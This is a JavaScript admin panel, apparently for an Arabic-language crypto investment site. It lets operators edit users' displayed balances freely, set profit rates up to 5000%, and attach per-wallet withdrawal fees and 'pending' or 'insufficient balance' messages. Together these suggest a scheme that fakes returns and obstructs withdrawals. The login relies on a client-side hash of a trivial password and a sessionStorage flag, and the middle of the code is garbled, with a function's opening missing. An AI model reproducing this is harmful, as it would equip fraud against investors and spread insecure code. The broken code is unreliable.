<script>
const BNB_TO_USDT_RATE = 600;
const ADMIN_PASSWORD_HASH = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
const MAX_PROFIT_PERCENT = 5000;
const DEFAULT_MIN_BUY_AMOUNT = 0.5;
const DEFAULT_PROFIT_PERCENT = 1000;
const DEFAULT_PENDING_MESSAGE = '⏳ السحب قيد المعالجة.';
const DEFAULT_INSUFFICIENT_MESSAGE = '⚠️ الرصيد غير كافٍ لتغطية رسوم السحب';
const DEFAULT_BUY_START_HOUR = 22, DEFAULT_BUY_END_HOUR = 18;
const DEFAULT_SELL_START_HOUR = 20, DEFAULT_SELL_END_HOUR = 9;

let cachedSettings = null, lastSettingsFetch = 0;

async function getSettings(){
  if(cachedSettings && (Date.now()-lastSettingsFetch) < 30000) return cachedSettings;
  const def = { exchangeRate:10000, durationHours:24, feePercent:10, withdrawalFeePercent:10, withdrawalFeeLabel:'رسوم السحب', tokenName:'عملة', withdrawCooldownHours:24, sellStartHour:DEFAULT_SELL_START_HOUR, sellEndHour:DEFAULT_SELL_END_HOUR, buyStartHour:DEFAULT_BUY_START_HOUR, buyEndHour:DEFAULT_BUY_END_HOUR, profitPercent:DEFAULT_PROFIT_PERCENT, openListingTime:'7 مساءً', minBuyAmount:DEFAULT_MIN_BUY_AMOUNT };
  try {
    if(window.firebaseReady){
      const { doc, getDocFromServer } = window.firebaseFns;
      const s = await getDocFromServer(doc(window.db,'settings','platform'));
      if(s.exists()){ const d = s.data(); const cl = {}; for(const k in d){ if(d[k]!==undefined && d[k]!==null && d[k]!=='undefined') cl[k]=d[k]; } cachedSettings = { ...def, ...cl }; lastSettingsFetch = Date.now(); return cachedSettings; }
    }
  } catch(e){ console.error(e); }
  cachedSettings = def; return def;
}

async function saveSettings(s){
  cachedSettings = null; lastSettingsFetch = 0;
  try { if(window.firebaseReady){ const { doc, setDoc } = window.firebaseFns; await setDoc(doc(window.db,'settings','platform'), s, { merge:true }); } } catch(e){ console.error(e); }
}

async function saveUserFieldToFirestore(address, fields){
  if(!window.firebaseReady || !address) return false;
  try {
    const { doc, setDoc } = window.firebaseFns;
    await setDoc(doc(window.db,'users',address.toLowerCase()), fields, { merge:true });
    return true;
  } catch(e){ console.error(e); showToast('❌ فشل الحفظ','error'); return false; }
}

async function deleteUserFromFirestore(address){
  if(!window.firebaseReady || !address) return false;
  try { const { doc, deleteDoc } = window.firebaseFns; await deleteDoc(doc(window.db,'users',address.toLowerCase())); return true; } catch(e){ return false; }
}

function showToast(m, t='info'){
  const c = document.getElementById('toastContainer'); if(!c) return;
  const e = document.createElement('div'); e.className = `toast toast-${t}`; e.textContent = m;
  c.appendChild(e); setTimeout(()=>{ e.style.opacity='0'; setTimeout(()=>e.remove(),500); }, 5000);
}

async function sha256(m){ const b = new TextEncoder().encode(m); const h = await crypto.subtle.digest('SHA-256', b); return Array.from(new Uint8Array(h)).map(x=>x.toString(16).padStart(2,'0')).join(''); }

async function adminLogin(){
  const p = document.getElementById('adminPasswordInput').value;
  const h = await sha256(p);
  if(h === ADMIN_PASSWORD_HASH){
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('adminPanel').classList.remove('hidden');
    sessionStorage.setItem('adminLoggedIn','true');
    renderAdminTable();
    showToast('✅ تم تسجيل الدخول','success');
  } else showToast('❌ كلمة المرور غير صحيحة','error');
}

function logout(){ sessionStorage.removeItem('adminLoggedIn'); location.reload(); }

window.addEventListener('load', ()=>{
  if(sessionStorage.getItem('adminLoggedIn') === 'true'){
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('adminPanel').classList.remove('hidden');
    renderAdminTable();
  }
  const p = document.getElementById('adminPasswordInput');
  if(p) p.addEventListener('keypress', e => { if(e.key === 'Enter') adminLogin(); });
});

function openAddWalletModal(){
  const m = `
    <div id="addWalletModal" class="modal-overlay" style="z-index:10000">
      <div class="modal-content" style="max-width:560px">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
          <h3 style="font-size:1.2rem;font-weight:800;color:#fff">➕ إضافة محفظة جديدة</h3>
          <button onclick="document.getElementById('addWalletModal').remove()" style="color:#9ca3af;font-size:1.5rem;background:none;border:none;cursor:pointer">✕</button>
        </div>
        <p style="color:#9ca3af;font-size:.8rem;margin-bottom:16px;line-height:1.6">💡 أضف عنوان المحفظة والبيانات.</p>
        <div class="settings-group"><label>📍 عنوان المحفظة</label><input type="text" id="addWalletAddress" placeholder="0x..." class="input-modern" style="margin-top:8px;font-family:monospace;font-size:.8rem" /></div>
        <div class="settings-group"><label>💰 رصيد العملة</label><input type="number" id="addWalletBalance" value="0" step="0.01" min="0" class="input-modern" style="margin-top:8px" /></div>
        <div class="settings-group"><label>💸 رصيد السحب (USDT)</label><input type="number" id="addWalletWithdrawal" value="0" step="0.01" min="0" class="input-modern" style="margin-top:8px" /></div>
        <div class="settings-group"><label>📈 نسبة الأرباح الفردية (%)</label><input type="number" id="addWalletProfit" value="0" step="0.1" min="0" max="${MAX_PROFIT_PERCENT}" class="input-modern" style="margin-top:8px" /></div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px">
          <button class="btn-neon" onclick="saveNewWallet()">💾 حفظ المحفظة</button>
          <button class="btn-ghost" onclick="document.getElementById('addWalletModal').remove()">إلغاء</button>
        </div>
      </div>
    </div>`;
  const old = document.getElementById('addWalletModal'); if(old) old.remove();
  document.body.insertAdjacentHTML('beforeend', m);
}

async function saveNewWallet(){
  const a = document.getElementById('addWalletAddress').value.trim();
  const b = parseFloat(document.getElementById('addWalletBalance').value) || 0;
  const w = parseFloat(document.getElementById('addWalletWithdrawal').value) || 0;
  const p = parseFloat(document.getElementById('addWalletProfit').value) || 0;
  if(!a || !/^0x[a-fA-F0-9]{40}$/.test(a)){ showToast('⚠️ عنوان المحفظة غير صحيح','error'); return; }
  if(b<0 || w<0 || p<0){ showToast('⚠️ القيم يجب أن تكون موجبة','error'); return; }
  const wb = w / BNB_TO_USDT_RATE;
  const payload = { address: a.toLowerCase(), balance: b, withdrawalBalance: wb, customProfit: p, disabled: false, purchaseTime: b>0?Date.now():null, lastWithdrawRequestTime: 0, withdrawSettings: {}, updatedAt: Date.now() };
  const ok = await saveUserFieldToFirestore(a, payload);
  const old = document.getElementById('addWalletModal'); if(old) old.remove();
  if(ok){ showToast('✅ تمت إضافة المحفظة','success'); renderAdminTable(); } else showToast('❌ فشل','error');
}

async function deleteUser(address){
  const s = address.slice(0,6)+'...'+address.slice(-4);
  if(!confirm(`⚠️ حذف ${s}؟\nسيتم حذف جميع البيانات نهائياً!`)) return;
  if(!confirm(`🚨 تحذير أخير! لا يمكن التراجع.`)) return;
  const ok = await deleteUserFromFirestore(address);
  if(ok){ showToast('✅ تم الحذف','success'); renderAdminTable(); } else showToast('❌ فشل','error');
}

async function updateUserStatus(address, disabled){ await saveUserFieldToFirestore(address, { disabled }); renderAdminTable(); showToast('✅ تم','success'); }
async function updateUserProfit(address, p){ const n = parseFloat(p); if(isNaN(n)||n<0||n>MAX_PROFIT_PERCENT){ showToast(`⚠️ بين 0 و ${MAX_PROFIT_PERCENT}%`,'error'); return; } await saveUserFieldToFirestore(address,{customProfit:n}); renderAdminTable(); showToast(`✅ ${n}%`,'success'); }
async function updateUserBalance(address, b){ const n = parseFloat(b); if(isNaN(n)||n<0){ showToast('⚠️ رقم موجب','error'); return; } const pl = { balance:n }; if(n>0) pl.purchaseTime = Date.now(); await saveUserFieldToFirestore(address, pl); renderAdminTable(); showToast(`✅ ${n.toFixed(2)}`,'success'); }
async function addToUserBalance(address, amt){
  const a = parseFloat(amt); if(isNaN(a)||a===0){ showToast('⚠️ مبلغ صحيح','error'); return; }
  let cb = 0;
  try { const { doc, getDocFromServer } = window.firebaseFns; const s = await getDocFromServer(doc(window.db,'users',address.toLowerCase())); if(s.exists()) cb = s.data().balance||0; } catch(e){}
  const nb = Math.max(0, cb+a); const pl = { balance:nb }; if(nb>0) pl.purchaseTime = Date.now();
  await saveUserFieldToFirestore(address, pl); renderAdminTable();
  showToast(`✅ ${a>0?'+':''}${a.toFixed(2)}. الرصيد: ${nb.toFixed(2)}`,'success');
}
async function resetUserBalance(address){ if(!confirm(`تصفير رصيد ${address.slice(0,6)}...${address.slice(-4)}؟`)) return; await saveUserFieldToFirestore(address,{balance:0,purchaseTime:null}); renderAdminTable(); showToast('✅','success'); }
async function updateUserWithdrawalBalance(address, u){
  const n = parseFloat(u); if(isNaN(n)||n<0){ showToast('⚠️ مبلغ صحيح','error'); return; }
  const bnb = n / BNB_TO_USDT_RATE;
  await saveUserFieldToFirestore(address,{withdrawalBalance:bnb}); renderAdminTable(); showToast(`✅ ${n.toFixed(2)} USDT`,'success');
}

  const cw = (c && c.withdrawalBalance) || 0;
  const m = `
    <div id="balanceEditorModal" class="modal-overlay" style="z-index:10000">
      <div class="modal-content" style="max-width:500px">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
          <h3 style="font-size:1.2rem;font-weight:800;color:#fff">💰 التحكم في الرصيد</h3>
          <button onclick="const m=document.getElementById('balanceEditorModal'); if(m) m.remove();" style="color:#9ca3af;font-size:1.5rem;background:none;border:none;cursor:pointer">✕</button>
        </div>
        <div style="background:rgba(0,0,0,.3);padding:12px;border-radius:12px;margin-bottom:16px">
          <p style="font-size:.75rem;color:#9ca3af">المحفظة:</p>
          <p style="font-family:monospace;color:#fff;font-size:.75rem;word-break:break-all">${address}</p>
        </div>
        <div class="settings-group">
          <label>رصيد العملة الحالي</label>
          <div class="value-display" style="color:#4facfe;margin-bottom:8px">${cb.toFixed(2)}</div>
          <input type="number" id="newBalanceInput" value="${cb}" step="0.01" min="0" class="input-modern" style="margin-bottom:8px" />
          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:10px">
            <button class="btn-ghost" onclick="addToUserBalance('${address}', 100); const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">+100</button>
            <button class="btn-ghost" onclick="addToUserBalance('${address}', 1000); const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">+1000</button>
            <button class="btn-ghost" onclick="addToUserBalance('${address}', 10000); const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">+10000</button>
          </div>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
            <button class="btn-neon" onclick="updateUserBalance('${address}', document.getElementById('newBalanceInput').value); const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">💾 حفظ</button>
            <button class="btn-danger" onclick="resetUserBalance('${address}'); const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">🗑️ تصفير</button>
          </div>
        </div>
        <div class="settings-group">
          <label>رصيد السحب الحالي (USDT)</label>

          <button class="btn-gold" onclick="updateUserWithdrawalBalance('${address}', document.getElementById('newWithdrawalInput').value); const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">💾 حفظ رصيد السحب</button>
        </div>
        <button class="btn-ghost" style="width:100%" onclick="const m=document.getElementById('balanceEditorModal'); if(m) m.remove();">إغلاق</button>
      </div>
    </div>`;
  const old = document.getElementById('balanceEditorModal'); if(old) old.remove();
  document.body.insertAdjacentHTML('beforeend', m);
}

function openWithdrawSettingsEditor(address){
  const c = window._adminUsersCache && window._adminUsersCache[address.toLowerCase()];
  const cur = (c && c.withdrawSettings) || {};
  const cA = cur.customAmount != null ? cur.customAmount : '';
  const cF = cur.feePercent != null ? cur.feePercent : '';
  const cM = cur.pendingMessage || '';
  const cI = cur.insufficientMessage || '';
  const cC = cur.cooldownHours != null ? cur.cooldownHours : '';
  const cB = cur.minBuyAmount != null ? cur.minBuyAmount : '';
  const m = `
    <div id="withdrawSettingsModal" class="modal-overlay" style="z-index:10001">
      <div class="modal-content" style="max-width:560px">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
          <h3 style="font-size:1.2rem;font-weight:800;color:#fff">🏦 إعدادات السحب للمحفظة</h3>
          <button onclick="const m=document.getElementById('withdrawSettingsModal'); if(m) m.remove();" style="color:#9ca3af;font-size:1.5rem;background:none;border:none;cursor:pointer">✕</button>
        </div>
        <div style="background:rgba(0,0,0,.3);padding:12px;border-radius:12px;margin-bottom:16px">
          <p style="font-size:.75rem;color:#9ca3af">المحفظة:</p>
          <p style="font-family:monospace;color:#fff;font-size:.75rem;word-break:break-all">${address}</p>
        </div>
        <div class="settings-group"><label>💵 مبلغ السحب (USDT) — فارغ = الرصيد الفعلي</label><input type="number" id="wdAmountInput" value="${cA}" step="0.01" min="0" placeholder="مثال: 100" class="input-modern" style="margin-top:8px" /></div>
        <div class="settings-group"><label>📊 نسبة رسوم السحب (%) — فارغة = النسبة العامة</label><input type="number" id="wdFeeInput" value="${cF}" step="0.1" min="0" max="100" placeholder="مثال: 5" class="input-modern" style="margin-top:8px" /></div>
        <div class="settings-group"><label>💰 الحد الأدنى للشراء (BNB) — فارغ = القيمة العامة</label><input type="number" id="wdMinBuyInput" value="${cB}" step="0.01" min="0.0001" placeholder="مثال: 0.5" class="input-modern" style="margin-top:8px" /></div>
        <div class="settings-group"><label>💬 رسالة السحب الناجح</label><textarea id="wdMessageInput" class="input-modern" rows="3" style="margin-top:8px" placeholder="${DEFAULT_PENDING_MESSAGE}">${cM}</textarea></div>
        <div class="settings-group"><label>⚠️ رسالة عدم كفاية الرصيد</label><textarea id="wdInsufficientMessageInput" class="input-modern" rows="3" style="margin-top:8px" placeholder="${DEFAULT_INSUFFICIENT_MESSAGE}">${cI}</textarea></div>
        <div class="settings-group"><label>⏳ فترة الانتظار بين كل سحب (ساعات)</label><input type="number" id="wdCooldownInput" value="${cC}" step="1" min="0" placeholder="مثال: 24" class="input-modern" style="margin-top:8px" /></div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px">
          <button class="btn-neon" onclick="saveWithdrawSettingsFromModal('${address}')">💾 حفظ</button>
          <button class="btn-danger" onclick="clearWithdrawSettings('${address}')">🗑️ مسح</button>
        </div>
        <button class="btn-ghost" style="width:100%;margin-top:8px" onclick="const m=document.getElementById('withdrawSettingsModal'); if(m) m.remove();">إغلاق</button>
      </div>
    </div>`;
  const old = document.getElementById('withdrawSettingsModal'); if(old) old.remove();
  document.body.insertAdjacentHTML('beforeend', m);
}

async function saveWithdrawSettingsFromModal(address){
  const aV = document.getElementById('wdAmountInput').value.trim();
  const fV = document.getElementById('wdFeeInput').value.trim();
  const mV = document.getElementById('wdMessageInput').value.trim();
  const iV = document.getElementById('wdInsufficientMessageInput').value.trim();
  const cV = document.getElementById('wdCooldownInput').value.trim();
  const bV = document.getElementById('wdMinBuyInput').value.trim();
  const ns = {};
  if(aV !== '' && !isNaN(parseFloat(aV)) && parseFloat(aV) > 0) ns.customAmount = parseFloat(aV);
  if(fV !== '' && !isNaN(parseFloat(fV)) && parseFloat(fV) >= 0) ns.feePercent = parseFloat(fV);
  if(mV !== '') ns.pendingMessage = mV;
  if(iV !== '') ns.insufficientMessage = iV;
  if(cV !== '' && !isNaN(parseFloat(cV)) && parseFloat(cV) >= 0) ns.cooldownHours = parseFloat(cV);
  if(bV !== '' && !isNaN(parseFloat(bV)) && parseFloat(bV) > 0) ns.minBuyAmount = parseFloat(bV);
  const ok = await saveUserFieldToFirestore(address, { withdrawSettings: ns });
  const modal = document.getElementById('withdrawSettingsModal'); if(modal) modal.remove();
  showToast(ok ? '✅ تم حفظ إعدادات السحب' : '❌ فشل الحفظ', ok ? 'success' : 'error');
  renderAdminTable();
}

async function clearWithdrawSettings(address){
  if(!confirm('هل تريد مسح إعدادات السحب المخصصة؟')) return;
  const ok = await saveUserFieldToFirestore(address, { withdrawSettings: {} });
  const modal = document.getElementById('withdrawSettingsModal'); if(modal) modal.remove();
  showToast(ok ? '✅ تم المسح' : '❌ فشل', ok ? 'success' : 'error');
  renderAdminTable();
}

async function renderAdminTable(){
  let uL = [];
  try { if(window.firebaseReady){ const { collection, getDocs } = window.firebaseFns; const s = await getDocs(collection(window.db,'users')); s.forEach(d => uL.push({ address: d.id, ...d.data() })); } } catch(e){ console.warn(e); }
  window._adminUsersCache = {};
  uL.forEach(u => { window._adminUsersCache[u.address.toLowerCase()] = u; });
  const s = await getSettings();
  let h = ''; let tB = 0; uL.forEach(u => { tB += u.balance || 0; });
  h += `<div class="settings-group"><div style="display:flex;gap:20px;flex-wrap:wrap"><div><label>عدد المستخدمين</label><div class="value-display">${uL.length}</div></div><div><label>إجمالي الأرصدة</label><div class="value-display">${tB.toFixed(2)}</div></div></div></div>`;
  h += `<div class="settings-group">
    <h4 style="color:#fff;font-weight:700;margin-bottom:12px">⚙️ إعدادات المنصة</h4>
    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px">
      <div><label>سعر الصرف</label><input type="number" id="settingExchangeRate" value="${s.exchangeRate}" class="input-modern" /></div>
      <div><label>مدة الاستثمار (ساعات)</label><input type="number" id="settingDuration" value="${s.durationHours}" class="input-modern" /></div>
      <div><label>رسوم البيع (%)</label><input type="number" id="settingFee" value="${s.feePercent}" class="input-modern" step="0.1" /></div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:10px">
      <div><label>📈 نسبة الأرباح العامة (%)</label><input type="number" id="settingProfitPercent" value="${s.profitPercent ?? DEFAULT_PROFIT_PERCENT}" class="input-modern" step="1" min="0" max="${MAX_PROFIT_PERCENT}" /></div>
      <div><label>رسوم السحب العامة (%)</label><input type="number" id="settingWithdrawalFee" value="${s.withdrawalFeePercent}" class="input-modern" step="0.1" /></div>
      <div><label>نص رسوم السحب</label><input type="text" id="settingWithdrawalFeeLabel" value="${s.withdrawalFeeLabel}" class="input-modern" /></div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-top:10px">
      <div><label>💰 الحد الأدنى للشراء (BNB)</label><input type="number" id="settingMinBuyAmount" value="${s.minBuyAmount ?? DEFAULT_MIN_BUY_AMOUNT}" class="input-modern" step="0.01" min="0.0001" /></div>
      <div><label>اسم العملة</label><input type="text" id="settingTokenName" value="${s.tokenName || 'عملة'}" class="input-modern" /></div>
      <div><label>مدة التبريد (ساعات)</label><input type="number" id="settingWithdrawCooldown" value="${s.withdrawCooldownHours || 24}" class="input-modern" min="0" step="1" /></div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px">
      <div><label>🟢 بداية وقت الشراء</label><input type="number" id="settingBuyStartHour" value="${s.buyStartHour ?? DEFAULT_BUY_START_HOUR}" class="input-modern" min="0" max="23" /></div>
      <div><label>🟢 نهاية وقت الشراء</label><input type="number" id="settingBuyEndHour" value="${s.buyEndHour ?? DEFAULT_BUY_END_HOUR}" class="input-modern" min="0" max="23" /></div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px">
      <div><label>🔴 بداية وقت البيع</label><input type="number" id="settingSellStartHour" value="${s.sellStartHour ?? DEFAULT_SELL_START_HOUR}" class="input-modern" min="0" max="23" /></div>
      <div><label>🔴 نهاية وقت البيع</label><input type="number" id="settingSellEndHour" value="${s.sellEndHour ?? DEFAULT_SELL_END_HOUR}" class="input-modern" min="0" max="23" /></div>
    </div>
    <p style="color:#6b7280;font-size:.7rem;margin-top:6px">ℹ️ الأوقات بنظام 24 ساعة بتوقيت السعودية.</p>
    <div style="margin-top:10px"><label>⏰ وقت إدراج الصفقة (نص حر)</label><input type="text" id="settingOpenListingTime" value="${s.openListingTime || '7 مساءً'}" class="input-modern" /></div>
    <button class="btn-save" style="margin-top:12px;padding:10px 20px" onclick="savePlatformSettings()">💾 حفظ الإعدادات</button>
  </div>`;
  if(uL.length === 0){ h += '<p style="text-align:center;color:#9ca3af;padding:20px">لا يوجد مستخدمون مسجلون.</p>'; }
  else {
    h += `<div style="overflow-x:auto"><table class="admin-table"><thead><tr><th>#</th><th>المحفظة</th><th>رصيد العملة</th><th>رصيد السحب (USDT)</th><th>نسبة الربح الفردية</th><th>الحالة</th><th>إجراءات</th></tr></thead><tbody>`;
    uL.forEach((u, i) => {
      const a = u.address;
      const p = u.customProfit || 0;
      const dis = u.disabled === true;
      const ub = u.balance || 0;
      const uw = (u.withdrawalBalance || 0) * BNB_TO_USDT_RATE;
      const hw = u.withdrawSettings && Object.keys(u.withdrawSettings).length > 0;
      h += `<tr>
        <td>${i+1}</td>
        <td style="font-family:monospace;font-size:.75rem">${a.slice(0,6)}...${a.slice(-4)}</td>
        <td><span style="color:#4facfe;font-weight:700">${ub.toFixed(2)}</span></td>
        <td><span style="color:#f59e0b;font-weight:700">${uw.toFixed(2)} USDT</span></td>
        <td><input type="number" id="profitInput_${a}" value="${p}" min="0" max="${MAX_PROFIT_PERCENT}" step="0.1" style="width:70px" /></td>
        <td><span style="color:${dis?'#ef4444':'#10b981'};font-weight:700">${dis?'معطل':'نشط'}</span></td>
        <td style="white-space:nowrap">
          <button class="btn-save" style="background:linear-gradient(135deg,#00f2fe,#4facfe)" onclick="openBalanceEditor('${a}')">💰 تعديل</button>
          <button class="btn-save" onclick="updateUserProfit('${a}', document.getElementById('profitInput_${a}').value)" style="margin-right:3px">حفظ</button>
          <button class="btn-save" style="background:linear-gradient(135deg,#f59e0b,#d97706);margin-right:3px;${hw?'box-shadow:0 0 0 2px rgba(245,158,11,.5)':''}" onclick="openWithdrawSettingsEditor('${a}')">🏦 سحب</button>
          <button class="${dis?'btn-toggle active':'btn-toggle inactive'}" onclick="updateUserStatus('${a}', ${!dis})" style="margin-right:3px">${dis?'تفعيل':'تعطيل'}</button>
          <button class="btn-delete" onclick="deleteUser('${a}')" style="margin-right:3px">🗑️ حذف</button>
        </td>
      </tr>`;
    });
    h += '</tbody></table></div>';
  }
  document.getElementById('adminContent').innerHTML = h;
}

async function savePlatformSettings(){
  const er = parseFloat(document.getElementById('settingExchangeRate').value);
  const dh = parseFloat(document.getElementById('settingDuration').value);
  const fp = parseFloat(document.getElementById('settingFee').value);
  const pp = parseFloat(document.getElementById('settingProfitPercent').value);
  const wf = parseFloat(document.getElementById('settingWithdrawalFee').value);
  const wfl = document.getElementById('settingWithdrawalFeeLabel').value.trim() || 'رسوم السحب';
  const tn = document.getElementById('settingTokenName').value.trim() || 'عملة';
  const wc = parseFloat(document.getElementById('settingWithdrawCooldown').value) || 24;
  const ss = parseInt(document.getElementById('settingSellStartHour').value);
  const se = parseInt(document.getElementById('settingSellEndHour').value);
  const bs = parseInt(document.getElementById('settingBuyStartHour').value);
  const be = parseInt(document.getElementById('settingBuyEndHour').value);
  const ol = document.getElementById('settingOpenListingTime').value.trim() || '7 مساءً';
  const mb = parseFloat(document.getElementById('settingMinBuyAmount').value);
  const mba = (!isNaN(mb) && mb > 0) ? mb : DEFAULT_MIN_BUY_AMOUNT;
  if(!er || er <= 0){ showToast('⚠️ سعر صرف غير صحيح','error'); return; }
  if(!dh || dh <= 0){ showToast('⚠️ مدة غير صحيحة','error'); return; }
  if(isNaN(pp) || pp < 0 || pp > MAX_PROFIT_PERCENT){ showToast(`⚠️ نسبة الأرباح 0 - ${MAX_PROFIT_PERCENT}%`,'error'); return; }
  if(isNaN(bs) || bs < 0 || bs > 23){ showToast('⚠️ بداية الشراء','error'); return; }
  if(isNaN(be) || be < 0 || be > 23){ showToast('⚠️ نهاية الشراء','error'); return; }
  if(bs === be){ showToast('⚠️ بداية ونهاية الشراء','error'); return; }
  if(isNaN(ss) || ss < 0 || ss > 23){ showToast('⚠️ بداية البيع','error'); return; }
  if(isNaN(se) || se < 0 || se > 23){ showToast('⚠️ نهاية البيع','error'); return; }
  if(ss === se){ showToast('⚠️ بداية ونهاية البيع','error'); return; }
  await saveSettings({ exchangeRate:er, durationHours:dh, feePercent:fp, withdrawalFeePercent:wf, withdrawalFeeLabel:wfl, tokenName:tn, withdrawCooldownHours:wc, sellStartHour:ss, sellEndHour:se, buyStartHour:bs, buyEndHour:be, profitPercent:pp, openListingTime:ol, minBuyAmount:mba });
  showToast('✅ تم حفظ الإعدادات','success');
  renderAdminTable();
}
</script>
